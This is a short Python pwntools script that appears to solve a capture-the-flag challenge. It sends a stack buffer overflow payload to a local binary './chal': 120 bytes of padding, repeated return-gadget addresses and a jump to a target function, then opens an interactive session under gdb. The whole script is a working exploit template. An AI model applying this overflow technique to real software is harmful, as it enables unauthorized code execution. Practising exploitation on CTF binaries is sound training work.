from pwn import *
# context.log_level ='debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
p = process("./chal")
gdb.attach(p)
payload = b"\0"*120+p64(0x40101a)*3+p64(0x4011b6)
p.send(payload.ljust(0x4000,b'\0'))
p.interactive()